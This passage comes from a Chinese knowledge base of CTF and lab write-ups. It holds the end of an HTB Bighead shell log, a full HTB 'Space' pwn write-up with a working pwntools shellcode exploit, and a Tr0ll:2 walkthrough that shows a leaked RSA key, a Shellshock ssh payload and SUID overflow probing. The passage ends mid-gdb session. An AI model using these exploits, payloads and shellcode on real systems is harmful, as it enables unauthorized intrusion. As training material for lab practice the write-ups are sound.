Ncat: Connection from 10.10.10.112.
Ncat: Connection from 10.10.10.112:49220.
Microsoft Windows [Version 6.0.6002]
Copyright (c) 2006 Microsoft Corporation.  All rights reserved.

C:\nginx>whoami
whoami
piedpiper\nelson

C:\nginx>cd .. 
cd ..

C:\>type users\nelson\desktop\user.txt
type users\nelson\desktop\user.txt

    .-''-.  .-------.      .---.    .-./`)     _______   .---.  .---.         
  .'_ _   \ |  _ _   \     | ,_|    \ .-.')   /   __  \  |   |  |_ _|         
 / ( ` )   '| ( ' )  |   ,-./  )    / `-' \  | ,_/  \__) |   |  ( ' )         
. (_ o _)  ||(_ o _) /   \  '_ '`)   `-'`"`,-./  )       |   '-(_{;}_)        
|  (_,_)___|| (_,_).' __  > (_)  )   .---. \  '_ '`)     |      (_,_)         
'  \   .---.|  |\ \  |  |(  .  .-'   |   |  > (_)  )  __ | _ _--.   |         
 \  `-'    /|  | \ `'   / `-'`-'|___ |   | (  .  .-'_/  )|( ' ) |   |         
  \       / |  |  \    /   |        \|   |  `-'`-'     / (_{;}_)|   |         
   `'-..-'  ''-'   `'-'    `--------`'---'    `._____.'  '(_,_) '---'         
          .---.       ,-----.    ,---.  ,---.   .-''-.     .-'''-.            
          | ,_|     .'  .-,  '.  |   /  |   | .'_ _   \   / _     \           
        ,-./  )    / ,-.|  \ _ \ |  |   |  .'/ ( ` )   ' (`' )/`--'           
        \  '_ '`) ;  \  '_ /  | :|  | _ |  |. (_ o _)  |(_ o _).              
         > (_)  ) |  _`,/ \ _/  ||  _( )_  ||  (_,_)___| (_,_). '.            
        (  .  .-' : (  '\_/ \   ;\ (_ o._) /'  \   .---..---.  \  :           
         `-'`-'|___\ `"/  \  ) /  \ (_,_) /  \  `-'    /\    `-'  |           
          |        \'. \_/``".'    \     /    \       /  \       /            
          `--------`  '-----'       `---`      `'-..-'    `-...-'             
                ,---------. .---.  .---.     .-''-.                           
                \          \|   |  |_ _|   .'_ _   \                          
                 `--.  ,---'|   |  ( ' )  / ( ` )   '                         
                    |   \   |   '-(_{;}_). (_ o _)  |                         
                    :_ _:   |      (_,_) |  (_,_)___|                         
                    (_I_)   | _ _--.   | '  \   .---.                         
                   (_(=)_)  |( ' ) |   |  \  `-'    /                         
                    (_I_)   (_{;}_)|   |   \       /                          
                    '---'   '(_,_) '---'    `'-..-'                           
                             .---.  .---.    ____       .-'''-. .---.  .---.  
      .-,                    |   |  |_ _|  .'  __ `.   / _     \|   |  |_ _|  
   ,-.|  \ _                 |   |  ( ' ) /   '  \  \ (`' )/`--'|   |  ( ' )  
   \  '_ /  |                |   '-(_{;}_)|___|  /  |(_ o _).   |   '-(_{;}_) 
   _`,/ \ _/                 |      (_,_)    _.-`   | (_,_). '. |      (_,_)  
  (  '\_/ \                  | _ _--.   | .'   _    |.---.  \  :| _ _--.   |  
   `"/  \  )                 |( ' ) |   | |  _( )_  |\    `-'  ||( ' ) |   |  
     \_/``"                  (_{;}_)|   | \ (_ o _) / \       / (_{;}_)|   |  
                             '(_,_) '---'  '.(_,_).'   `-...-'  '(_,_) '---'
```

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/bigheadwebsvr8.jpg)

<!-- kb:end hack-the-box-bigheadwebsvr -->

</details>

<a id="case-pwn-space"></a>

## 分裂缓冲区中的短 shellcode

18 字节与 9 字节空间分布限制 payload 布局，原文用短跳转和寄存器状态连接两段 shellcode。偏移和操作码逐项保留。

<p class="kb-provenance">来源 pwn-space · 原记录 2021-09-01 · 6 个代码块 · 8 处图片引用</p>

<details class="kb-evidence" id="record-pwn-space">
<summary>查看分析过程、攻击步骤与完整代码</summary>

<!-- kb:start pwn-space -->

#### 详细过程及exp
#### 1. Basic checks:

``` bash
┌──(root💀kali)-[~/hackthebox/challenge/pwn/space]
└─# file space
space: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=90e5767272e16e26e1980cb78be61437b3d63e12, not stripped
┌──(root💀kali)-[~/hackthebox/challenge/pwn/space]
└─# checksec space
[*] '/root/hackthebox/challenge/pwn/space/space'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
```



#### 2. Debug binary with buffer overflow string as input:

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/space.jpg)

#### 3. Check the EIP offset:

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/space1.jpg)

#### 4. Control EIP with custom bytes:

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/space2.jpg)

#### 5. Check the space for the custom payload:

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/space3.jpg)

There is 18B + 9B space split by 4 Bytes for the EIP register.

So payload could look like great post [https://www.abatchy.com/2017/05/jumping-to-shellcode.html](https://www.abatchy.com/2017/05/jumping-to-shellcode.html):

``` bash
# Payload skeleton:
1. [2nd_stage_shellcode]                           = 18B
2. [EIP] - jump to 1st_stage_shellcode             = 4B
3. [1st_stage_shellcode + jmp 2nd_stage_shellcode] = 9B
```

#### 6. Find ROP gadget for EIP to start shellcode:

Basically, "jmp esp" just jump into execution flow on the next instruction on the stack,
which will be 1st_stage shellcode and another jump.

``` bash
┌──(root💀kali)-[~/hackthebox/challenge/pwn/space]
└─# ROPgadget --binary space | grep "jmp esp"
0x08049199 : add byte ptr [0x212a], al ; jmp esp
0x08049197 : add byte ptr [eax], al ; add byte ptr [0x212a], al ; jmp esp
0x08049198 : add byte ptr [eax], al ; add eax, 0x212a ; jmp esp
0x0804919d : add byte ptr [eax], al ; jmp esp
0x0804919a : add eax, 0x212a ; jmp esp
0x0804919f : jmp esp
0x0804919b : sub ah, byte ptr [ecx] ; add byte ptr [eax], al ; jmp esp
0x08049196 : test eax, 0x5000000 ; sub ah, byte ptr [ecx] ; add byte ptr [eax], al ; jmp esp
```

#### 7. Shellcode writing:

``` bash
┌──(root💀kali)-[~/hackthebox/challenge/pwn/space]
└─# python -c 'from pwn import *; print(disasm("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\xb0\x0b\xcd\x80"))'
   0:   31 c0                   xor    eax, eax
   2:   50                      push   eax
   3:   68 2f 2f 73 68          push   0x68732f2f
   8:   68 2f 62 69 6e          push   0x6e69622f
   d:   89 e3                   mov    ebx, esp
   f:   89 c1                   mov    ecx, eax
  11:   b0 0b                   mov    al, 0xb
  13:   cd 80                   int    0x80
```

#### 8. Shellcode customization:

EAX stores (18B + 4B + 9B) data provided as input during overflow.

Without the "mov esp, eax" step, second_stage_shellcode would break the execution flow, because pushed "0x6e69622f" would be treated as data to execute, while it should be stored for further executed syscall and treated as an argument for execve() stored in EBX register. [https://security.stackexchange.com/questions/98311/problems-executing-shellcode-via-nop-sled](https://security.stackexchange.com/questions/98311/problems-executing-shellcode-via-nop-sled)

Then set up EAX and ECX registers to 0. A short jump to the first 18B on the stack. Great article which explains, why we jump 0xe2 — available [https://thestarman.pcministry.com/asm/2bytejumps.htm](https://thestarman.pcministry.com/asm/2bytejumps.htm)

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/space4.jpg)

Secondly, we just set up arguments for the [execve()](https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md#x86_64-64_bit).
(Check this article, if you don't know CDQ instruction)

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/space5.jpg)

Final shellcode:

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/space6.jpg)

#### 9. Working exploit:

 - getflag.py

``` python
from pwn import *

context.log_level = "debug"
second_stage_shellcode = "\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x99\xb0\x0b\xcd\x80"
print("[+] second_stage_shellcode:", second_stage_shellcode)
eip = p32(0x0804919f)
print("[+] eip address:", eip)
first_stage_shellcode = "\x89\xc4\x31\xc0\x89\xc1\xeb\xe2"
print("[+] first_stage_shellcode:", first_stage_shellcode)
payload = second_stage_shellcode + eip + first_stage_shellcode
print("[+] final shellcode payload:", payload)

p = remote("46.101.23.188",32417)

p.writeafter("> ",payload)
print("[+] sending first_stage_shellcode + second_stage_shellcode...")
p.interactive()
```

``` bash
┌──(root💀kali)-[~/hackthebox/challenge/pwn/space]
└─# python getflag.py
('[+] second_stage_shellcode:', 'Ph//shh/bin\x89\xe3\x99\xb0\x0b\xcd\x80')
('[+] eip address:', '\x9f\x91\x04\x08')
('[+] first_stage_shellcode:', '\x89\xc41\xc0\x89\xc1\xeb\xe2')
('[+] final shellcode payload:', 'Ph//shh/bin\x89\xe3\x99\xb0\x0b\xcd\x80\x9f\x91\x04\x08\x89\xc41\xc0\x89\xc1\xeb\xe2')
[+] Opening connection to 46.101.23.188 on port 32417: Done
[DEBUG] Received 0x2 bytes:
    '> '
[DEBUG] Sent 0x1e bytes:
    00000000  50 68 2f 2f  73 68 68 2f  62 69 6e 89  e3 99 b0 0b  │Ph//│shh/│bin·│····│
    00000010  cd 80 9f 91  04 08 89 c4  31 c0 89 c1  eb e2        │····│····│1···│··│
    0000001e
[+] sending first_stage_shellcode + second_stage_shellcode...
[*] Switching to interactive mode
$ id
[DEBUG] Sent 0x3 bytes:
    'id\n'
[DEBUG] Received 0x2a bytes:
    'uid=999(ctf) gid=999(ctf) groups=999(ctf)\n'
uid=999(ctf) gid=999(ctf) groups=999(ctf)
$ whoami
[DEBUG] Sent 0x7 bytes:
    'whoami\n'
[DEBUG] Received 0x4 bytes:
    'ctf\n'
ctf
$ ls
[DEBUG] Sent 0x3 bytes:
    'ls\n'
[DEBUG] Received 0x20 bytes:
    'flag.txt\n'
    'run_challenge.sh\n'
    'space\n'
flag.txt
run_challenge.sh
space
$ cat flag.txt
[DEBUG] Sent 0xd bytes:
    'cat flag.txt\n'
[DEBUG] Received 0x1c bytes:
    'HTB{sh3llc0de_1n_7h3_5p4c3}\n'
HTB{sh3llc0de_1n_7h3_5p4c3}
```

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/space7.jpg)

#### 摘自(致敬原作)......

 - 浏览medium.com博客每月有次数限制，并且5$收费，故摘录文章。。。
 - [PWN Space challenge - HTB](https://karol-mazurek95.medium.com/space-challenge-pwn-htb-4bc70c503537)

<!-- kb:end pwn-space -->

</details>

<a id="case-tr0ll-2"></a>

## 归档材料、Shellshock 与 SUID 溢出

ZIP、密钥和 SSH 限制连接 Shellshock，后续在 SUID 程序中定位溢出。原始 shellcode、坏字符与地址布局留存。

<p class="kb-provenance">来源 Tr0ll-2 · 原记录 2020-04-01 · 23 个代码块 · 4 处图片引用</p>

<details class="kb-evidence" id="record-tr0ll-2">
<summary>查看分析过程、攻击步骤与完整代码</summary>

<!-- kb:start Tr0ll-2 -->

#### 名称
名称：Tr0ll: 2
发布日期：2014年10月24日

#### 下载

Tr0ll2.rar
 - Download (Mirror): https://download.vulnhub.com/tr0ll/Tr0ll2.rar
 - Download (Torrent): https://download.vulnhub.com/tr0ll/Tr0ll2.rar.torrent 

Tr0ll2_vbox.rar
 - Download (Mirror): https://download.vulnhub.com/tr0ll/Tr0ll2_vbox.rar
 - Download (Torrent): https://download.vulnhub.com/tr0ll/Tr0ll2_vbox.rar.torrent



#### 描述

Tr0ll系列VM中的第2台靶机。这比原始的Tr0ll难度有所提高，但是解决所需的时间大致相同，并且不会出错，巨魔仍然存在！:)

难度是从初学者到中级。

VM应该从DHCP提取有效IP。该VM已通过验证，可以在VMware工作站5，VMware Player 5，VMware Fusion和Virtual box上运行。virtual box用户可能需要启用附加的网卡才能拉出有效的IP地址。

特别感谢@ Eagle11，@ superkojiman和@leonjza经历了测试，并感谢freenode上#overflowsec的成员给了一些建议。如果机器有问题，请随时通过@ Maleus21或maleus overflowsecurity.com与我联系。-马累www.overflowsecurity.comTr0ll2.rar = VMware，Tr0ll2_vbox.rar = VirtualBox


#### 信息收集

上nmap

``` bash
root@kali:~# nmap -sn -v 192.168.66.*
Nmap scan report for 192.168.66.16
Host is up (0.00030s latency).
MAC Address: 00:0C:29:F7:66:43 (VMware)
```

``` bash
root@kali:~# nmap -sV -v -p- 192.168.66.16
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.0.8 or later
22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))
MAC Address: 00:0C:29:F7:66:43 (VMware)
```

``` bash
root@kali:~# nmap -p 21,22,80 -A -v -T4 --script=vuln 192.168.66.16
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.0.8 or later
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
|_sslv2-drown: 
22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0)
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|_  /robots.txt: Robots file
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| vulners: 
|   cpe:/a:apache:http_server:2.2.22: 
|       CVE-2017-7679   7.5     https://vulners.com/cve/CVE-2017-7679
|       CVE-2017-7668   7.5     https://vulners.com/cve/CVE-2017-7668
|       CVE-2017-3169   7.5     https://vulners.com/cve/CVE-2017-3169
|       CVE-2017-3167   7.5     https://vulners.com/cve/CVE-2017-3167
|       CVE-2013-2249   7.5     https://vulners.com/cve/CVE-2013-2249
|       CVE-2018-1312   6.8     https://vulners.com/cve/CVE-2018-1312
|       CVE-2013-1862   5.1     https://vulners.com/cve/CVE-2013-1862
|       CVE-2014-0231   5.0     https://vulners.com/cve/CVE-2014-0231
|       CVE-2014-0098   5.0     https://vulners.com/cve/CVE-2014-0098
|       CVE-2013-6438   5.0     https://vulners.com/cve/CVE-2013-6438
|       CVE-2013-5704   5.0     https://vulners.com/cve/CVE-2013-5704
|       CVE-2016-4975   4.3     https://vulners.com/cve/CVE-2016-4975
|       CVE-2013-1896   4.3     https://vulners.com/cve/CVE-2013-1896
|       CVE-2012-4558   4.3     https://vulners.com/cve/CVE-2012-4558
|       CVE-2012-3499   4.3     https://vulners.com/cve/CVE-2012-3499
|       CVE-2016-8612   3.3     https://vulners.com/cve/CVE-2016-8612
|_      CVE-2012-2687   2.6     https://vulners.com/cve/CVE-2012-2687
```

dirb目录爆破一波

``` bash
root@kali:~# dirb http://192.168.66.16/

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Tue Mar 31 23:19:58 2020
URL_BASE: http://192.168.66.16/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.66.16/ ----
+ http://192.168.66.16/cgi-bin/ (CODE:403|SIZE:289)                                                                       
+ http://192.168.66.16/index (CODE:200|SIZE:110)                                                                          
+ http://192.168.66.16/index.html (CODE:200|SIZE:110)                                                                     
+ http://192.168.66.16/robots (CODE:200|SIZE:346)                                                                         
+ http://192.168.66.16/robots.txt (CODE:200|SIZE:346)                                                                     
+ http://192.168.66.16/server-status (CODE:403|SIZE:294)                                                                  
                                                                                                                          
-----------------
END_TIME: Tue Mar 31 23:20:04 2020
DOWNLOADED: 4612 - FOUND: 6
```

查看robots.txt
http://192.168.66.16/robots

``` bash
User-agent:*
Disallow:
/noob
/nope
/try_harder
/keep_trying
/isnt_this_annoying
/nothing_here
/404
/LOL_at_the_last_one
/trolling_is_fun
/zomg_is_this_it
/you_found_me
/I_know_this_sucks
/You_could_give_up
/dont_bother
/will_it_ever_end
/I_hope_you_scripted_this
/ok_this_is_it
/stop_whining
/why_are_you_still_looking
/just_quit
/seriously_stop
```

将/robots.txt中找到的所有路径添加到字典中，然后再次dirb。

``` bash
root@kali:~/vulnhub/troll2# dirb http://192.168.66.16/ wordlist /usr/share/wordlists/dirb/common.txt

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Tue Mar 31 23:29:24 2020
URL_BASE: http://192.168.66.16/
WORDLIST_FILES: wordlist

-----------------

GENERATED WORDS: 21                                                            

---- Scanning URL: http://192.168.66.16/ ----
+ http://192.168.66.16//noob (CODE:301|SIZE:313)                                                                          
+ http://192.168.66.16//keep_trying (CODE:301|SIZE:320)                                                                   
+ http://192.168.66.16//dont_bother (CODE:301|SIZE:320)                                                                   
+ http://192.168.66.16//ok_this_is_it (CODE:301|SIZE:322)                                                                 
                                                                                                                          
-----------------
END_TIME: Tue Mar 31 23:29:24 2020
DOWNLOADED: 21 - FOUND: 4
```

找到了4个目录，但除了HTML图像中的图像和注释之外，什么都没有。

``` bash
<html>
<img src='cat_the_troll.jpg'>
<!--What did you really think to find here? Try Harder!>
</html>
```

对于目录，发现这是一张已导入到名为cat_the_troll.jpg的页面的图像，然后全部下载了它们。一开始没有发现任何差异，然后尝试检查所有jpg文件的MD5总和。

``` bash
root@kali:~/vulnhub/troll2# md5sum *.jpg
f094e16de91dae231812a2fb382d8803  dont_bother.jpg
8e40e4bf4212b317788de52381072cd8  keep_trying.jpg
8e40e4bf4212b317788de52381072cd8  noob.jpg
8e40e4bf4212b317788de52381072cd8  ok_this_is_it.jpg
973c57fc28ca1ce8703bdaf102f80370  tr0ll_again.jpg
```

dont_bother.jpg具有不同的MD5哈希值，因此请看一下。

``` bash
root@kali:~/vulnhub/troll2# strings dont_bother.jpg 
JFIF
#3-652-108?QE8<M=01F`GMTV[\[7DcjcXjQY[W
)W:1:WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW
...
Look Deep within y0ur_self for the answer
```

浏览器访问到http://192.168.66.16/y0ur_self/，找到了一个名为answer.txt的文件。看起来像一个密码文件。但是每个密码都用base64编码

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub233.jpg)

answer.txt

``` bash
QQo=
QQo=
QUEK
QUIK
QUJNCg==
QUMK
QUNUSAo=
QUkK
QUlEUwo=
QU0K
QU9MCg==
QU9MCg==
QVNDSUkK
QVNMCg==
```

与Web服务无关。继续进行FTP服务。
使用Tr0ll作为用户名和密码登录很容易。找到了一个zip文件，并将其pull到Kali上，但该zip文件受密码保护。

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub234.jpg)

现在解码answer.txt文本中的base64加密字符串，并用作字典来解压缩zip文件

``` bash
cat answer.txt | base64 --decode > decoded_answer.txt
```

``` bash
root@kali:~/vulnhub/troll2# fcrackzip -v -D -u -p decoded_answer.txt lmao.zip
found file 'noob', (size cp/uc   1300/  1679, flags 9, chk 1005)


PASSWORD FOUND!!!!: pw == ItCantReallyBeThisEasyRightLOL
```

解压缩后查看压缩包内的文件

``` bash
root@kali:~/vulnhub/troll2# unzip lmao.zip
Archive:  lmao.zip
[lmao.zip] noob password: 
  inflating: noob                    
root@kali:~/vulnhub/troll2# ls -la
总用量 2408
drwxr-xr-x  2 root root    4096 4月   1 01:50 .
drwxrwxrwx 11 root root    4096 3月  31 23:26 ..
-rw-r--r--  1 root root 1412653 10月  4  2014 answer.txt
-rw-r--r--  1 root root  886136 4月   1 01:47 decoded_answer.txt
-rw-r--r--  1 root root   15873 4月   1 01:26 dont_bother.jpg
-rw-r--r--  1 root root   15831 4月   1 01:26 keep_trying.jpg
-rw-r--r--  1 root root    1474 4月   1 01:49 lmao.zip
-rw-------  1 root root    1679 10月  4  2014 noob
-rw-r--r--  1 root root   15831 4月   1 01:26 noob.jpg
-rw-r--r--  1 root root   15831 4月   1 01:26 ok_this_is_it.jpg
-rw-r--r--  1 root root   77438 4月   1 01:26 tr0ll_again.jpg
-rw-r--r--  1 root root     322 3月  31 23:27 wordlist
root@kali:~/vulnhub/troll2# cat noob
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAsIthv5CzMo5v663EMpilasuBIFMiftzsr+w+UFe9yFhAoLqq
yDSPjrmPsyFePcpHmwWEdeR5AWIv/RmGZh0Q+Qh6vSPswix7//SnX/QHvh0CGhf1
/9zwtJSMely5oCGOujMLjDZjryu1PKxET1CcUpiylr2kgD/fy11Th33KwmcsgnPo
q+pMbCh86IzNBEXrBdkYCn222djBaq+mEjvfqIXWQYBlZ3HNZ4LVtG+5in9bvkU5
z+13lsTpA9px6YIbyrPMMFzcOrxNdpTY86ozw02+MmFaYfMxyj2GbLej0+qniwKy
e5SsF+eNBRKdqvSYtsVE11SwQmF4imdJO0buvQIDAQABAoIBAA8ltlpQWP+yduna
u+W3cSHrmgWi/Ge0Ht6tP193V8IzyD/CJFsPH24Yf7rX1xUoIOKtI4NV+gfjW8i0
gvKJ9eXYE2fdCDhUxsLcQ+wYrP1j0cVZXvL4CvMDd9Yb1JVnq65QKOJ73CuwbVlq
UmYXvYHcth324YFbeaEiPcN3SIlLWms0pdA71Lc8kYKfgUK8UQ9Q3u58Ehlxv079
La35u5VH7GSKeey72655A+t6d1ZrrnjaRXmaec/j3Kvse2GrXJFhZ2IEDAfa0GXR
xgl4PyN8O0L+TgBNI/5nnTSQqbjUiu+aOoRCs0856EEpfnGte41AppO99hdPTAKP
aq/r7+UCgYEA17OaQ69KGRdvNRNvRo4abtiKVFSSqCKMasiL6aZ8NIqNfIVTMtTW
K+WPmz657n1oapaPfkiMRhXBCLjR7HHLeP5RaDQtOrNBfPSi7AlTPrRxDPQUxyxx
n48iIflln6u85KYEjQbHHkA3MdJBX2yYFp/w6pYtKfp15BDA8s4v9HMCgYEA0YcB
TEJvcW1XUT93ZsN+lOo/xlXDsf+9Njrci+G8l7jJEAFWptb/9ELc8phiZUHa2dIh
WBpYEanp2r+fKEQwLtoihstceSamdrLsskPhA4xF3zc3c1ubJOUfsJBfbwhX1tQv
ibsKq9kucenZOnT/WU8L51Ni5lTJa4HTQwQe9A8CgYEAidHV1T1g6NtSUOVUCg6t
0PlGmU9YTVmVwnzU+LtJTQDiGhfN6wKWvYF12kmf30P9vWzpzlRoXDd2GS6N4rdq
vKoyNZRw+bqjM0XT+2CR8dS1DwO9au14w+xecLq7NeQzUxzId5tHCosZORoQbvoh
ywLymdDOlq3TOZ+CySD4/wUCgYEAr/ybRHhQro7OVnneSjxNp7qRUn9a3bkWLeSG
th8mjrEwf/b/1yai2YEHn+QKUU5dCbOLOjr2We/Dcm6cue98IP4rHdjVlRS3oN9s
G9cTui0pyvDP7F63Eug4E89PuSziyphyTVcDAZBriFaIlKcMivDv6J6LZTc17sye
q51celUCgYAKE153nmgLIZjw6+FQcGYUl5FGfStUY05sOh8kxwBBGHW4/fC77+NO
vW6CYeE+bA2AQmiIGj5CqlNyecZ08j4Ot/W3IiRlkobhO07p3nj601d+OgTjjgKG
zp8XZNG8Xwnd5K59AVXZeiLe2LGeYbUKGbHyKE3wEVTTEmgaxF4D1g==
-----END RSA PRIVATE KEY-----
```

是的rsa私钥。查看SSH服务。因为文件名为noob，所以尝试使用用户noob和私钥登录SSH服务。

``` bash
root@kali:~/vulnhub/troll2# ssh -i noob noob@192.168.66.16
The authenticity of host '192.168.66.16 (192.168.66.16)' can't be established.
ECDSA key fingerprint is SHA256:I3xuSgcBlIsoldKTkOyVYwx8B4NLGl0fDDTi0H6ExYg.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.66.16' (ECDSA) to the list of known hosts.
TRY HARDER LOL!
Connection to 192.168.66.16 closed.
```

#### 利用

能够登录，但连接被关闭。有一段时间，Vulnhub于2014年10月24日发布了此易受攻击的操作系统。在此附近，存在一个漏洞可以绕过此漏洞

 - 参考[SHELLSHOCK漏洞](https://resources.infosecinstitute.com/practical-shellshock-exploitation-part-2/#gref)

``` bash
root@kali:~/vulnhub/troll2# ssh -i noob noob@192.168.66.16 '() { :;}; /bin/bash'
id
uid=1002(noob) gid=1002(noob) groups=1002(noob)
whoami
noob
pwd
/home/noob
```

现在有一个低权限shell。然后查看目录收集敏感信息。

``` bash
cd /
ls
bin
boot
dev
etc
home
initrd.img
lib
lost+found
media
mnt
nothing_to_see_here
opt
proc
root
run
sbin
selinux
srv
sys
tmp
usr
var
vmlinuz
cd nothing_to_see_here
ls
choose_wisely
cd choose_wisely
ls
door1
door2
door3
ls -al *
door1:
total 16
drwsr-xr-x 2 root root 4096 Oct  4  2014 .
drwsr-xr-x 5 root root 4096 Oct  4  2014 ..
-rwsr-xr-x 1 root root 7271 Oct  4  2014 r00t

door2:
total 16
drwsr-xr-x 2 root root 4096 Oct  5  2014 .
drwsr-xr-x 5 root root 4096 Oct  4  2014 ..
-rwsr-xr-x 1 root root 7273 Oct  5  2014 r00t

door3:
total 20
drwsr-xr-x 2 root root 4096 Oct  5  2014 .
drwsr-xr-x 5 root root 4096 Oct  4  2014 ..
-rwsr-xr-x 1 root root 8401 Oct  5  2014 r00t
```

现在发现有设置SUID位的r00t二进制文件。认为必须利用这些二进制文件。

``` bash
root@kali:~/vulnhub/troll2# ssh -i noob noob@192.168.66.16 '() { :;}; /bin/bash'
cd /nothing_to_see_here/choose_wisely/door1
./r00t $(python -c 'print "A" * 1000')
Good job, stand by, executing root shell...
BUHAHAHA NOOB!
Good job, stand by, executing root shell...
BUHAHAHA NOOB!
cd /nothing_to_see_here/choose_wisely/door2
./r00t $(python -c 'print "A" * 1000')

2 MINUTE HARD MODE LOL
cd /nothing_to_see_here/choose_wisely/door3
./r00t $(python -c 'print "A" * 1000')Connection to 192.168.66.16 closed by remote host.
```

尝试了很多次，发现door3中的r00t容易受到缓冲区溢出的影响，因此将利用这一点。（实际上，它是随机的，当离开一段时间到达目标时，注意到它会将易受攻击的r00t文件更改为另一个door。）

创建模式字符串以查找缓冲区大小。

``` bash
root@kali:~/vulnhub/troll2# /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 500
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq
```

目标机器上使用GDB。

``` bash
cd /nothing_to_see_here/choose_wisely/door3
ls -la
total 20
drwsr-xr-x 2 root root 4096 Oct  5  2014 .
drwsr-xr-x 5 root root 4096 Oct  4  2014 ..
-rwsr-xr-x 1 root root 8401 Oct  5  2014 r00t
gdb -q ./r00t
Reading symbols from /nothing_to_see_here/choose_wisely/door3/r00t...done.
(gdb) r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq
